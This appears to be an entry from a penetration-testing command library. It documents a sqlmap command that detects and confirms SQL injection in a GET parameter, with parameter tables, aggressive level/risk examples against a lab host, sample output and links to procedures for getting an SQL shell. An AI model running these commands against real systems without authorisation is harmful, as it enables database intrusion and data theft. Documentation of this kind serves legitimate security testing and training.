---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: sqlmap-detect-and-confirm-injection
type: command
executor: bash
data: sqlmap -u "$_TARGET_URL?$_PARAMETER=" --batch --level=3 --risk=2
output: |-
  [INFO] starting at [TIMESTAMP]
  [INFO] testing connection to the target URL
  [INFO] testing MySQL
  [INFO] confirming MySQL
  [INFO] the back-end DBMS is MySQL
  web application technology: Apache, PHP
  back-end DBMS: MySQL >= 5.0.0
  [INFO] fetched current database
  current database: 'vulcart'
created_at: '2023-10-01T12:00:00Z'
updated_at: '2023-10-01T12:00:00Z'
platforms:
  - Linux
  - Web
tags:
  - sqlmap
  - detection
  - sqli
verified: true
validated: true
---

# sqlmap-detect-and-confirm-injection

## Command

```bash
sqlmap -u "$_TARGET_URL?$_PARAMETER=" --batch --level=3 --risk=2
```

## Description

This command uses SQLMap to automatically detect SQL injection vulnerabilities in a specified URL parameter, confirm the backend DBMS, and identify injection techniques without requiring user interaction. It is used during the reconnaissance phase to validate exploitability before deeper exploitation like obtaining a shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u | Target URL with injectable parameter (use quotes for complex URLs) | Yes |
| $_TARGET_URL | Base URL of the web application (e.g., http://192.168.43.68/vcart/search.php) | Yes |
| $_PARAMETER | Vulnerable GET parameter name followed by = (e.g., term=) | Yes |
| --batch | Non-interactive mode; accepts defaults | No |
| --level=3 | Test level (1-5; higher includes more vectors) | No |
| --risk=2 | Risk level (1-3; higher includes riskier payloads) | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://target.com/search.php?term=" --batch
```

### Advanced Usage

```bash
sqlmap -u "http://192.168.43.68/vcart/search.php?term=" --batch --level=5 --risk=3 --dbms=mysql
```

## Expected Output

SQLMap will output detection logs, including warnings for empty parameters, connection tests, DBMS confirmation (e.g., 'the back-end DBMS is MySQL'), and injection point details like 'Parameter: term (GET) Type: time-based blind'. If a session is resumed, it lists prior payloads.

## Related

- [[commands/sqlmap-obtain-sql-shell]]
- [[procedures/Exploit-SQL-Injection-with-SQLMap-to-Obtain-SQL-Shell]]
